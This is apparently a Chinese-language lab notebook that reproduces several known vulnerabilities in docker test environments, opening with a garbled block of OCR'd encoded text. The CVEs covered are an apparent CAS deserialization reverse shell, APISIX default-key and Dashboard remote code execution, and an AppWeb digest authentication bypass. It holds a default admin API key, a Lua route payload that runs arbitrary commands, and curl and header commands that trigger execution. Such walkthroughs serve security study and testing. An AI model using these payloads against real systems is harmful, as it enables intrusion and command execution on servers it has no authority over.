482F6AXFJMF64QAWFME9JSNICQR2BIPXUHZX6U1CLSVJAIZIK3BCL01HI04IHDIJD65MKYL7GZ6GS H9SBVNVBWAHRBRBRTM4SILFSAQ3PUBFOVS2QCXYFCZSYIYGGRTBZSUJLTPIPKDWOCDHGRKD5CDCR YBJAWHUUHQDEJCTQMNOIOWWH0%2ECCAJTIADFOXCFOWRSFMOOBDR3RXJIFMSRSUXTJJTJBY2PXSYL 2PKYBOC9LBZ6BQ83H20YWV65UGMMNNJ05ADXIV3D6W7JS9IVONVZV%2FFY6P%2BRT09ZE82FINFLN E8WUD6BRD82BUQIRHZ3UBXDFWBIPCDCNHDKFDEGYGAOFSSZBNA3FIANJE32BIMCHIXEGXPRP1DP98 YIVHLC4FQOZ6Z5NSATX9AYHDE2010LARNMJRKBB9NYO7U7CYOB6R5JZZTOVJSCRASWXUF09FYBIVO ADESFJ1BX2BIBEYKEPUH9UNATIMUGPOAXBKX82BVSTORTV1NOFZHTKBGKDIOLON9F7YSKQT5F20W8 2BGHD5ATCNBAF&2BBTCA6ZE2FHEK232F1065VHIPVUHKA7IPOR38TUBTS7D7RYUFNG19ZF3KSGPDE ZWMTAMYVIOY0CS8GP4JKXFN3T0I07MBTE4RWSAVI0%2BYHYX9DFUERMDS4BLWXSC82FASFXLICELA V1CNZ82FIN82EG362XSXOKLCNT23828Q3LFLFIXLRAPD%2FBDR82FOINOXJWHWTYPZKUKWE82FKUBY LSPSYXDABEB9L6BV9BXGRSY5AKWWILXY9V%280U4Q5QEKFQMJ9YWUONONNTRMUR1JXUJLOMNOXS%2 FVSWDODZKEJKNGHD226828FWBKF6FTENTTSD%2FCV29NREDCOZNX7EFE5HCLIEY10X3F%2FPIRTDN RIUTTYTJB5BQDEV2MCAYIWNKIRBK%28MBLD1QGLUJDULS2BHRMWIVIVIGK5AEWVHIQ56N641JL82F0U CLIK882FIZPB50NS94J5%2FZU6GPAAW082F3K6BMII3JTOVHSBL7INP7U130VBDOUNLL82BLXJCAO QN13PDS1ER9N4%2FIVU82FEZQDYHDJLOJXHS4C75IPSJAX47GAE28DTBUUKNW7AXNUZ3JKVAHHUKH QSJBJCZJWTEJ3AGKDYTDVZQTHNQCIQMORBXFLWCN7HCMAOTVMLSBI9JFABGEUIG8TEZCG82FPFJ0UL E56911H2KLUO1JXKMP7XISZYNGYUZS7QXOULFFZZQTCREFLR82BMBLYHYQEOWYOD多2BYZ6GNFSR2 0JGZSKUHNKECGVTYZZP6L828I0UW54M353RKFRL6FYQ8WQBMSRBELCCO1PEDOYZUHXJCMYBZYGQI4 XS6GT -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803821825-c1a8ec8c-3e6b-4ce7-a0ad-4858100b3c22.png)

<!-- 这是一张图片，ocr 内容为：RESPONSE REQUEST PRETTY ACTIONS ACTIONS RAW PRETTY RAW RENDER 7 CONTENT-TYPE: APPLICATION/X-WWW-TORM-URLENCODED HTTP/1.1 500 8 CONTENT-LENGTH:2441 PRAQMA:NO-CACHE 9 ORIGIN:HTTP://192.168.254.135:8080 EXPIRES:THU,01 JAN 1970 00:00:00 GMT 10 CONNECTION:CLOSE CACHE-CONTROL:NO-CACHE 11 REFERER: HTTP://192.168.254.135:8080/CAS/LOGIN CACHE-CONTROL:NOSTORE 12 COOKIE: JSESSIONID-45924B67BE606ED9C887D6A075D6CAA1 S SET-COOKIE: JSESSIONID 23535581C93F80854DA85EBD89A67FD 13 UP UPGRADE-INSECUREQUESTS:1 CONTENT-TYPE:TEXT/HTML;CHARSET-UTF-8 14 CONTENT-LENGTH:1399 15USE USERNAMEADMINGPASSWORDADMIN&LT DATE:SUN, 23 JUN  2024 07:38:40 GMT LT-4-WK9FGCQQQXZE4YTZOHDADTOMNO2QJAT-CASO1.EXAMPLE.ORQGEXECUTION- 10 CONNECTION: CLOSE LA9FC0621-F79B - 4CFB-842E- A315A8DAE541 AAAIGAABAABAPFK IGVCSPF%2BEWDNBMO%2BL 11 (KAAAABMFLCZEYOFD3DWDVNAF3SOU82BN6382BRBYYWN7SRECHNWOUBHSMBXLDUANYKFCWB. 12 (JHTIEYDAWW2KKTYY9XU6CV5SDKKYW30SFCPBEZ1DGURBG9LYHOU9FUFRSCBE3XZBXJAEWGY 13 (H%2FY4QLXHP4%2BR82FJEV865A4UK2DSPGIYGIH9V8AU400NCXGF4LJRJG3WFBVRDLICBLOA <!DOCTYPE HTML> 14 RRVIUZSFYIE3CJM282BFIJ6NGPYK4YUQWMLEU63HMDZU2NYHWE3MQCVGTXZH82FBZHUSMG30 15 IF%2F3AHMCOB2K%2FFMXPL729RTQBNDNC4IMLDKHY7VBIROUDLQGS9JEOUJFEJ1LEPHG9GF2X 16 AYBZQLDX40S28CYX13&2BPA9FVJ%2F4XYHYIGQSPPPPPPFKDOIYT%2BA5YBSGTWXEUPHQS 17 UYTQBPDSBDS1FQ6X82BPD8VSOCARYNELPICQTWH8B97NZYFROOAK2QQYWFNMTTISLPFKEVTB. 18 IVLGUUC82B4KKPQFMT282F582FWEX&2FEWTWRDSP2026B2JPP0377ASCPLCDAKKSIIK%2BFYJ 19 FMCY 3MUKN&2F6%2BVEGSNWYQ7PGHZNZP%2BP 282FT OAN640MP6NF YRS66PSWADD5BTI 4W 20 STLA%2FXRXYPDCX282FKOLC06CBSQ2HSAENQWEBTDRFYJYXCA5%2FGHZYFQQUQOMHZFKDFZ 21 ZJW3MR&2BBOC6XMSYQZOQOMAXPVVFVCLXQKCVJY1CA号2FRZFRZPJHUZPD0G00JP9?2BS50Q1HYL NXSASOJRVQ394VSQQNKNGVH3GPDIEYEVLXOS4DLPVPW)LSEIBNGWSPEVBMC74:2F6MXF JMF6 <HTMLANG"EN"> :4QAWFME9JSNICQ828IPXUHZXOULCLSVJAIZIK3BCLO1HIO4THDIJD6SNKYL7QZCGGH9SBVMY HEAD BWAHRBRTMASILFSAQ3PT3PUBFOVS2QCXYFCZSYJYGGRTBZSUJLRPIPKDWOCDHGRKDSCDCRYB 82254 META CHARSET"UTF-8"/> (JAWHUUHQDEJCTQMMOIOYWHO%2BCCAJTIADFOXCFOWR8FMOOBDR3RXJIFMSRSUXTJJTJJTJ8Y2PX META NAME,"VIEWPORT" CONTENT-"WIDTHDEVICE-WIDTH, SVLZPKYBOC9LBZGBQ83H20YWY65UGMMNNJ 05ADXI V3DBW7J59IVONVZV名2FFY6P&2BRT09ZE %2FIMFLNE8WUD6BRD%2BUQIRHZ3UBXDRWBIPCDCNHDKFPFGYGAOFSSZBNA3FIQNJG%2BIMCH <TITLE> (1XEGXPRP1DP98Y1 VHLCAFQOZ625M5ATX9AYHDE2OIOLARNMJRKBB9NYO7U7CYOB6G5JZGTOY CAS &#8211;CENTRAL AUTHENTICATION SERVICE IJSCRAGWXUF09FYBIVOADEBFJ 1B32BI8EYKEPUH9UNATIMUGPOAXBKX82BVSTORTVINOF ZHTK </TITLE> B6KDIOLON9F7YSKAT5F20W%2BCMD5ATCNBMF;2BBRCA6ZE2FHEK 282F106SWHIPVUHKA71PO LEEN IR38TUBTQ7RYUFNG19Z+3KSOPDEZWMTAMYVIOY0C58GP43KXFH3T010107MBTE4RWG4YI0628 YHYX9DFUEGMDS4BLWXSC%2FASFXLICELAV1CM282FINP2FQ362XSXOKLCNTG%2BQ3LFIQIXL LINK REL-'ST -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803821782-35730cc6-5dbb-4982-ad50-44d27fcf347b.png)

<font style="color:#1f2328;background-color:#FFFFFF;">监听端口，成功反弹</font><font style="color:#1f2328;background-color:#FFFFFF;">shell:</font>

<!-- 这是一张图片，ocr 内容为：-(KALIGKALI)-[~] COOKIE:JSESSIONID45924B67BE606ED ULLY TESTED ON THIS $ NC -L -P 999 UPGRADE-INSECURE-REQUESTS: 1 INAPPROPRIATE IOCTL FOR DEVICE BASH: CANNOT SET TERMINAL PROCESS GROUP (1):  BASH: NO JOB CONTROL IN THIS SHELL 5 USERNAME-ADMIN&PASSWORDADMIN&LT ROOTAODBE3SAAD3BF://UST/LOCAL/TONCAT# WHOANI WHOAMI A9FC0621-F79B-4CFB-842E-A315A8DAE5 ROOT ROOT@0DBE35AAD3BF://USR/LOCAL/TOMCAT# ID ID /HOME/KALI/YSOSERIAL UID-0(ROOT) GID-0(ROOT) GROUPS-0(ROOT) ROOT@0DBE35AAD3BF://USR/LOCAL/TOMCAT# -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803822040-f90fe8e4-5e51-401f-90db-a039f120bab7.png)

# <font style="color:#1f2328;background-color:#FFFFFF;">Apache APISIX </font><font style="color:#1f2328;background-color:#FFFFFF;">默认密钥漏洞（</font><font style="color:#1f2328;background-color:#FFFFFF;">CVE-2020-13945</font><font style="color:#1f2328;background-color:#FFFFFF;">）</font>
## <font style="color:#1f2328;background-color:#FFFFFF;">漏洞环境</font>
<font style="color:#1f2328;background-color:#FFFFFF;">执行如下命令启动一个</font><font style="color:#1f2328;background-color:#FFFFFF;">Apache APISIX 2.11.0</font><font style="color:#1f2328;background-color:#FFFFFF;">（这个漏洞并没有且应该不会被官方修复，所以到最新版仍然存在）：</font>

```plain
docker compose up -d
```

<font style="color:#1f2328;background-color:#FFFFFF;">环境启动后，访问</font><font style="color:#1f2328;">http://your-ip:9080</font><font style="color:#1f2328;background-color:#FFFFFF;">即可查看到默认的</font><font style="color:#1f2328;background-color:#FFFFFF;">404</font><font style="color:#1f2328;background-color:#FFFFFF;">页面。</font>

<!-- 这是一张图片，ocr 内容为：192.168.254.135:9080 KALI TRAINING KALI FORUMS KALI D KALI TOOLS KALI LINUX {"ERROR MSG":"404 ROUTE NOT FOUND"} -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780804494758-521be1ff-2790-4610-af88-2c93b243eda6.png)

## <font style="color:#1f2328;background-color:#FFFFFF;">漏洞复现</font>
<font style="color:#1f2328;background-color:#FFFFFF;">利用默认</font><font style="color:#1f2328;background-color:#FFFFFF;">Token</font><font style="color:#1f2328;background-color:#FFFFFF;">增加一个恶意的</font><font style="color:#1f2328;background-color:#FFFFFF;">router</font><font style="color:#1f2328;background-color:#FFFFFF;">，其中包含恶意</font><font style="color:#1f2328;background-color:#FFFFFF;">LUA</font><font style="color:#1f2328;background-color:#FFFFFF;">脚本：</font>

```plain
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1

{
    "uri": "/attack",
"script": "local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n local args = assert(ngx.req.get_uri_args()) \n local f = assert(io.popen(args.cmd, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close()  \n end \nreturn _M",
    "upstream": {
        "type": "roundrobin",
        "nodes": {
            "example.com:80": 1
        }
    }
}

```

<!-- 这是一张图片，ocr 内容为：1X TARGET:HTTP://192.16 CANCEL SEND REQUEST RESPONSE ACTIONS IN PRETTY ACTIONS RAW RENDER PRETTY RAW POST /APISIX/ADMIN/ROUTES HTTP/1.1 1 HTTP/1.1 201 CREATED 2HOST:192.168.254.135:9080 DATE:SUN,23 JUN 2024 08:23:59 GMT 2DA 3CONTENT-TYPE:APPLICATION/JSON USER-AGENT: MOZILLA/5.0 (X1L; LINUX X86 64: RV:109.0) GECKO/2010101 FIREF 4 CONNECTION: CLOSE ACCEPT:TEXT/HTML,APPLICATION/XHTML+XML,APPLICATION/XMLIQ-0.9,IMAGE/AVIT,I 5 SERVER: APISIX/2.11.0 ACCEPT-LANGUAGE:EN-US,EN;Q0.5 6A ACCEPT-ENCODING:GZIP,DEFLATE ACCESSCONTROL-ALLOW-ORIQIN: ACCESS-CONTROL-ALLOW-CREDENTIALS: TRUE CONNECTION:CLOSE X-API-KEY:EDDLC9F034335F136F87AD84B625C8F1 8 ACCESS-CONTROL-EXPOSE-HEADERS: ACCESS-CONTROL-MAX-AGE:3600 UPGRADE-INSECUREQUESTS:1 10 CONTENT-LENGTH:406 10 CONTENT-LENGTH:574 11 121 "URI":"/ATTACK", "NODE":F M : {} \N FUNCTION  KEV":"\/APISIX\/ROUTES\/0000000000000000000019", _M.ACCESS(CONF, CTX) \N LOCAL OS "SCRIPT " LOCAL UPSTREAM":{ "VALUE":{ "CREATE TIME":1719131039, "TYPE":"ROUNDROBIN", "ID":"0000000000000000019", "NODES": "EXAMPLE.COM:80':1 "UPDATE TIME":1719131039, _M : {} \N FUNCTION _M.ACCESS(CONF, "SCRIPT":"LOCAL "URI':"/ATTACK", "PRIORITY":O, 'STATUS":1, UPSTREAM':I 'HASH_ON":"VARS", "PASS HOST":"PASS", "TYPE":"ROUNDROBIN", "SCHEME":"HTTP", "NODES":{ EXAMPLE.COM:80*:1 子 ACTION': CREATE -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780804494880-d754a269-79f0-4cc9-a4a2-0089b7cca4c2.png)

<font style="color:#1f2328;background-color:#FFFFFF;">然后，我们访问刚才添加的</font><font style="color:#1f2328;background-color:#FFFFFF;">router</font><font style="color:#1f2328;background-color:#FFFFFF;">，就可以通过</font><font style="color:#1f2328;background-color:#FFFFFF;">cmd</font><font style="color:#1f2328;background-color:#FFFFFF;">参数执行任意命令：</font>

```plain
http://your-ip:9080/attack?cmd=id
```

<!-- 这是一张图片，ocr 内容为：192.168.254.135:9080/ATTACL > 192.168.254.135:9080/ATTACK?CMD KALI FORUMS KALI LINUX NETHU KALI TRAINING KALI TOOLS KALI DOCS UID-99(NOBODY) GID-99(NOBODY) GROUPS-99(NOBODY) -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780804494775-98505ea8-7972-4dc9-aac3-778240369c8b.png)

# <font style="color:#1f2328;background-color:#FFFFFF;">Apache APISIX Dashboard API</font><font style="color:#1f2328;background-color:#FFFFFF;">权限绕过导致</font><font style="color:#1f2328;background-color:#FFFFFF;">RCE</font><font style="color:#1f2328;background-color:#FFFFFF;">（</font><font style="color:#1f2328;background-color:#FFFFFF;">CVE-2021-45232</font><font style="color:#1f2328;background-color:#FFFFFF;">）</font>
## <font style="color:#1f2328;background-color:#FFFFFF;">漏洞环境</font>
<font style="color:#1f2328;background-color:#FFFFFF;">执行如下命令启动一个有漏洞的</font><font style="color:#1f2328;background-color:#FFFFFF;">Apache APISIX Dashboard 2.9</font><font style="color:#1f2328;background-color:#FFFFFF;">：</font>

```plain
docker compose up -d
```

<font style="color:#1f2328;background-color:#FFFFFF;">然后访问</font><font style="color:#1f2328;">http://your-ip:9000/</font><font style="color:#1f2328;background-color:#FFFFFF;">即可看到</font><font style="color:#1f2328;background-color:#FFFFFF;">Apache APISIX Dashboard</font><font style="color:#1f2328;background-color:#FFFFFF;">的登录页面。</font>

<!-- 这是一张图片，ocr 内容为：192.168.254.135:9000/USER/LOGIN?REDIRECT/ EXPLOIT-DB KALI TRAINING OFFENSIVE SECURITY KALI TOOLS KALI FORUMS MSFU KALI DOCS NETHUNTER KALI LINUX OTHER BOOKMARKS APISIX APACHE APISIX DASHBOARD CLOUD-NATIVE MICROSERVICES API GATEWAY USERNAME & PASSWORD USERNAME 品 PASSWORD HOW TO UPDATE USERNAME/PASSWORD? LOGIN COPYRIGHT 2021 APACHE APISIX -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807717162-c04b62be-a482-4014-87c4-541f3a876804.png)

## <font style="color:#1f2328;background-color:#FFFFFF;">漏洞复现</font>
<font style="color:#1f2328;background-color:#FFFFFF;">利用</font><font style="color:#1f2328;">/apisix/admin/migrate/export</font><font style="color:#1f2328;background-color:#FFFFFF;">和</font><font style="color:#1f2328;">/apisix/admin/migrate/import</font><font style="color:#1f2328;background-color:#FFFFFF;">两个Apache APISIX Dashboard提供的未授权API，我们可以简单地导入一个恶意配置文件，其中包含我们构造的LUA脚本：</font>

<font style="color:#1f2328;background-color:#FFFFFF;"></font>

<font style="color:#1f2328;background-color:#FFFFFF;">注意的是，这个配置文件的最后</font><font style="color:#1f2328;background-color:#FFFFFF;">4</font><font style="color:#1f2328;background-color:#FFFFFF;">个字符是当前文件的</font><font style="color:#1f2328;background-color:#FFFFFF;">CRC</font><font style="color:#1f2328;background-color:#FFFFFF;">校验码，所以最好通过自动化工具来生成和发送这个利用数据包，比如</font>[这个POC](https://github.com/wuppp/cve-2021-45232-exp#tdsub)<font style="color:#1f2328;background-color:#FFFFFF;">。</font>

<!-- 这是一张图片，ocr 内容为：-(KALIGKALI)-[~/DESKTOP/VULHUB-MASTER/APISIX/CVE-2021-452321 RCE.PV HTTP://192.168.254.135:9000 PYTHON3 APISIX DASHBOARD ATTACK SUCCESS ERAT1ONS URI IS://OIHLIO ACCESS OPERATIONS WILL BE DENIG -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807717275-d0964463-74bb-478e-848d-16a3212c316b.png)

<font style="color:#1f2328;background-color:#FFFFFF;">添加完恶意路由后，你需要访问</font><font style="color:#1f2328;background-color:#FFFFFF;">Apache APISIX</font><font style="color:#1f2328;background-color:#FFFFFF;">中对应的路径来触发前面添加的脚本。值得注意的是，</font><font style="color:#1f2328;background-color:#FFFFFF;">Apache APISIX</font><font style="color:#1f2328;background-color:#FFFFFF;">和</font><font style="color:#1f2328;background-color:#FFFFFF;">Apache APISIX Dashboard</font><font style="color:#1f2328;background-color:#FFFFFF;">是两个不同的服务，</font><font style="color:#1f2328;background-color:#FFFFFF;">Apache APISIX Dashboard</font><font style="color:#1f2328;background-color:#FFFFFF;">只是一个管理页面，而添加的路由是位于</font><font style="color:#1f2328;background-color:#FFFFFF;">Apache APISIX</font><font style="color:#1f2328;background-color:#FFFFFF;">中，所以需要找到</font><font style="color:#1f2328;background-color:#FFFFFF;">Apache APISIX</font><font style="color:#1f2328;background-color:#FFFFFF;">监听的端口或域名。</font>

<font style="color:#1f2328;background-color:#FFFFFF;">在当前环境下，</font><font style="color:#1f2328;background-color:#FFFFFF;">Apache APISIX</font><font style="color:#1f2328;background-color:#FFFFFF;">监听在</font><font style="color:#1f2328;background-color:#FFFFFF;">9080</font><font style="color:#1f2328;background-color:#FFFFFF;">端口下。我们发送数据包：</font>

<!-- 这是一张图片，ocr 内容为：包X个个 192.168.254.135:9080 KALI TRAINING KALI TOOLS KALI LINUX KALI FORUMS KAL -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807717267-77d1e9d8-bed4-4517-a93e-8f0616b9ba20.png)

<!-- 这是一张图片，ocr 内容为：RESPONSE REQUEST PRETTY RAW ACTIONS PRETTY ACTIONS RENDER RAW HTTP/1.1 1 GET 123456789 /OTHLIO HTTP/1.1  200  OK HOST:192.168.254.135:9080 DATE:SUN,23 JUN 2024 09:13:51 GMT CONTENT-TYPE: TEXT/PLAIN; CHARSET-UTF-8 USER-AGENT: MOZILLA/5.0 (X11; LINUX X86 64; RV:109.0) GECK0/20100101 FIREFOX/115.0 CONNECTION:CLOSE SERVER:APISIX/2.9 ACCEPT: LTEXT/HTML,APPLICATION/XHTML+XML,APPLICATION/XMLIQ-0.9,IMAGE/AVIT,IMAGE/WE CONTENT-LENGTH:49 BP,*/*;Q-0.8 SUID-99(NOBODY) GID-99(NOBODY) GROUPS-99(NOBODY) 56 ACCEPT-LANGUAGE:EN-US,EN;Q0.5 ACCEPT-ENCODING:GZIP,DEFLATE 10 CONNECTION:CLOSE 600 CMD:ID CACHE-CONTROL:MAX-AQEO 10 UPGRADE-INSECURE-REQUESTS: 1 11 -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807717326-531b0645-8fe7-485b-a137-0e382cbf9992.png)

<font style="color:#1f2328;background-color:#FFFFFF;">可见，我们在</font><font style="color:#1f2328;background-color:#FFFFFF;">Header</font><font style="color:#1f2328;background-color:#FFFFFF;">中添加的</font><font style="color:#1f2328;">CMD</font><font style="color:#1f2328;background-color:#FFFFFF;">头中的命令已被执行。</font>

<font style="color:#1f2328;background-color:#FFFFFF;">也可以通过之前的</font><font style="color:#1f2328;background-color:#FFFFFF;">POC</font><font style="color:#1f2328;background-color:#FFFFFF;">实现命令执行：</font>

```plain
curl http://your-ip:9080/LQsRF0 -H "cmd: id"
```

<!-- 这是一张图片，ocr 内容为：-(KALISKALI)-[/DESKTOP/VULHUB-MASTER/APISIX/CVE-2021-4523232] S CURL HTTP://192.168.254.135:9080/0IHLIO -H "CMD: ID" UID-99(NOBODY) GID-99(NOBODY) GROUPS-99(NOBODY) -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807717467-04467638-6835-42cf-bf43-e2d241cbaa4d.png)

<font style="color:#1f2328;background-color:#FFFFFF;">这个漏洞是Apache APISIX Dashboard的漏洞，而Apache APISIX无需配置IP白名单或管理API，只要二者连通同一个etcd即可。</font>

# <font style="color:#1f2328;background-color:#FFFFFF;">AppWeb</font><font style="color:#1f2328;background-color:#FFFFFF;">认证绕过漏洞（</font><font style="color:#1f2328;background-color:#FFFFFF;">CVE-2018-8715</font><font style="color:#1f2328;background-color:#FFFFFF;">）</font>
## <font style="color:#1f2328;background-color:#FFFFFF;">漏洞环境</font>
<font style="color:#1f2328;background-color:#FFFFFF;">执行如下命令启动一个带有</font><font style="color:#1f2328;background-color:#FFFFFF;">digest</font><font style="color:#1f2328;background-color:#FFFFFF;">认证的</font><font style="color:#1f2328;background-color:#FFFFFF;">Appweb 7.0.1</font><font style="color:#1f2328;background-color:#FFFFFF;">服务器：</font>

```plain
docker compose up -d
```

<font style="color:#1f2328;background-color:#FFFFFF;">访问</font><font style="color:#1f2328;">http://your-ip:8080</font><font style="color:#1f2328;background-color:#FFFFFF;">，可见需要输入账号密码。</font>

<!-- 这是一张图片，ocr 内容为：192.168.254.135:8080 了 MSFU KALI TOOLS OFFENSIVE SECURITY KALI FORUMS KALI DOCS TRAINING NETHUNTER 192.168.254.135:8080 THIS SITE IS ASKING YOU TO SIGN IN. USERNAME PASSWORD SIGN IN CANCEL SEARCH -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807798932-0dfac962-27ca-4421-b9f3-cf1b1ff4b948.png)

## <font style="color:#1f2328;background-color:#FFFFFF;">漏洞复现</font>
<font style="color:#1f2328;background-color:#FFFFFF;">利用该漏洞需要知道一个已存在的用户名，当前环境下用户名为</font><font style="color:#1f2328;">admin</font><font style="color:#1f2328;background-color:#FFFFFF;">。</font>

<!-- 这是一张图片，ocr 内容为：192.168.254.135:8080 THIS SITE IS ASKING YOU TO SIGN IN. USERNAME ADMIN PASSWORD SIGN IN CANCEL -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807798938-af3d4b31-b83c-457c-89cd-38034a10fe95.png)

<font style="color:#1f2328;background-color:#FFFFFF;">构造头</font><font style="color:#1f2328;">Authorization: Digest username=admin</font><font style="color:#1f2328;background-color:#FFFFFF;">，并发送如下数据包：</font>

<font style="color:#1f2328;background-color:#FFFFFF;">可见，因为我们没有传入密码字段，所以服务端出现错误，直接返回了</font><font style="color:#1f2328;background-color:#FFFFFF;">200</font><font style="color:#1f2328;background-color:#FFFFFF;">，且包含一个</font><font style="color:#1f2328;background-color:#FFFFFF;">session</font><font style="color:#1f2328;background-color:#FFFFFF;">：</font>

<!-- 这是一张图片，ocr 内容为：REQUEST ACTIONS PRETTY RAW 1 G GET / HTTP/1.1 2  HOST:192.168.254.135:8080 AUSER-AGENT: MOZILLA/5.0 (X1L; LINUX X86-64; RY:109.0) GECKO/201001 FIREFOX/115.0 INACCEPT: TEXT/HTML,APPLICATION/XHTML+XML,APPLICATION/XML;G:0.9,INAGB/AVIT,INAGB/WEBP,*/*:GE0.3 ACCEPT-LANGUAGE:EN-US,EN;Q.5 ACCEPT-ENCODING:GZIP,DEFLATE CONNECTION:CLOSE UPGRADE-INSECURE-REQUESTS:1 AUTHORIZATION:DIGEST USERNAME"ADMIN" 10 11 SEARCH... RESPONSE RAW RENDER ACTIONS PRETTY 123 HTTP/1.1  200  OK PATH;DOMAIN192.168.254.135;HTTPONLY SET-COOKIE: -HTTP-SESSION--1::HTTP.SESSION::FE000CC7E044AD1F6B4FF865845EA005 VARY:ACCEPT-ENCODING X-FRAME-OPTIONS: SAMEORI GIN CONTENT-TYPE:TEXT/HTML X-CONTENT-TYPE-OPTIONS: NOSNIFF DATE:MON, 24 JUN  2024 06:13:00 GMT ETAG:1655269083 CACHE-CONTROL:NOCACHE"SET-COOKIE" 9 CAC 10 CONTENT-LENGTH:3322 11 X-XSS-PROTECTION: 1; MODE-BLOCK 12 LAST-MODIFIED:MON, 10 AUG 2020 17:10:05 GMT 13 CONNECTION: CLOSE 14A ACCEPT-RANGES:BYTES -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807799013-959a1d5c-2111-4e94-8dac-d2a24750aed3.png)

<font style="color:#1f2328;background-color:#FFFFFF;">设置这个</font><font style="color:#1f2328;background-color:#FFFFFF;">session</font><font style="color:#1f2328;background-color:#FFFFFF;">到浏览器，即可正常访问需要认证的页面：</font>

<!-- 这是一张图片，ocr 内容为：DASHBOARD PROJECT OPTIONS COMPARER INTRUDER REPEATER PROXY EXTENDER DECODER SEQUENCER TARGET HTTP HISTORY WEBSOCKETS HISTORY OPTIONS INTERCEPT REQUEST TO HTTP://192.168.254.135:8080 FORWARD ACTION DROP OPEN BROWSER INTERCEPT IS ON PRETTY RAW ACTIONS 1234 GET / HTTP/1.1 HOST: 192.168.254.135:8080 LUSER-AGENT:MOZILLA/5.0 (X11; LINUX X86 64; RV:109.0) GECKO/20100101 FIREFOX/115.0 ILACCEPT:TEXT/HTML,APPLICATION/ZHTML+XML,APPLICATION/XML:G-0.9,IMAGE/AVIT,IMAGE/MEGP,*/*IG-0.3 ACCEPT-LANGUAGE:EN-US,EN;Q.5 ACCEPT-ENCODING:GZIP,DEFLATE CONNECTION:CLOSE 8 UPGRADE-INSECURE-REQUESTS:1 LAUTHORIZATION: DIGEST USERNANANANADMIN"-HTTP-SESSION-;L:;HTTP,SESSION;:FE900CC78044DLFBB4FFA6504503 10 -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807798948-e4425ff9-f8bc-4bdb-997d-49b1e81322eb.png)

<!-- 这是一张图片，ocr 内容为：192.168.254.135:8080 OFFENSIVE SECURITY KALI DOCS NETHUNTER MSFU KALI FORUMS KALI TOOLS KALI LINUX EXPLOIT- KALI TRAINING TM APPWEB <STRONG>WEB SERVER</STRONG> APPWEB-THE FAST, LITTLE WEB SERVER IT IS BLAZING FAST TO SERVE WEB PAGES, YET USES VERY LITLE MEMORY. QUICK START 1. READ THE LATEST DOCUMENTATION. 2.USE THE APPWEB APPMAN MANAGEMENT PROGRAM TO STOP, START AND CONTROL APPWEB. 3.TRY THE ESP WEB FRAMEWORK TOUR. APPWEB RESOURCES AND USEFUL LINKS ' IN CASE YOU DONT HAVE THE LATEST COPY OF APPVED (VERSION:YOU CAN DOWNLOAD A BINAR) DISTIBUTION OR A SOURCE ARCHIVE FROM:HTTPS://EMBEDTHIS.COM/APPWEB/DOWNLOAD.HTML.  OR YOU CAN GO STRAIGHT TO THE PUBIC SOURCE CODE REPOSTORY AT HTIPSILGITHUB.COMLEMBEDTHISLAPPWED. YOU MAY WISH TO READ THE LATEST DOCUMENTATION. I FOR SUPPORT, YOU MAY ALSO ASK QUESTIONS IN THE FORM OF WESCRIBED ISSUES AT THE GTHUB ISSUEB ISSUE DATABASE. ' DONT FORGET TO CHECK OUT THE SAMPLES INGLUDED WITH  THE PRODUCT DOCUMENTATON, THEY WILL GUR USE; OUR AIM IS TO FIX BUGS AS QUICKY AS POSSBLE AND WE ARE ARE AWAYS LOOKING FOR WAYS TO IMPRODUCT AND OUR SERVICE - SO PLEASE LET US KNOW,BY EMAILING DEV@EMBEDTHIS.COM. FOR DETAILS ABOUT OUR COMMERCIAL OFFERINGS, PLEASE OLEASE CONTACT:SALES@EMBEDTHIS.COM. THANKS.EMBEDTHIS TEAM. -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807799132-6fd051e7-79fd-4163-8af8-2e625c5a2be2.png)

# <font style="color:#1f2328;background-color:#FFFFFF;">Aria2 </font><font style="color:#1f2328;background-color:#FFFFFF;">任意文件写入漏洞</font>
## <font style="color:#1f2328;background-color:#FFFFFF;">环境搭建</font>
<font style="color:#1f2328;background-color:#FFFFFF;">启动漏洞环境：</font>

```plain
docker compose up -d
```

<font style="color:#1f2328;background-color:#FFFFFF;">6800</font><font style="color:#1f2328;background-color:#FFFFFF;">是</font><font style="color:#1f2328;background-color:#FFFFFF;">aria2</font><font style="color:#1f2328;background-color:#FFFFFF;">的</font><font style="color:#1f2328;background-color:#FFFFFF;">rpc</font><font style="color:#1f2328;background-color:#FFFFFF;">服务的默认端口，环境启动后，访问</font><font style="color:#1f2328;">http://your-ip:6800/</font><font style="color:#1f2328;background-color:#FFFFFF;">，发现服务已启动并且返回</font><font style="color:#1f2328;background-color:#FFFFFF;">404</font><font style="color:#1f2328;background-color:#FFFFFF;">页面。</font>

<!-- 这是一张图片，ocr 内容为：10 KB YET ANOTH 192.168.254.135:6800/ X 192.168.254.135:6800 KALI FORUMS KALI TRAINING KALI TOOLS KALI LINUX -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807844796-3fc37c57-0d87-4952-ba93-e4d266363698.png)

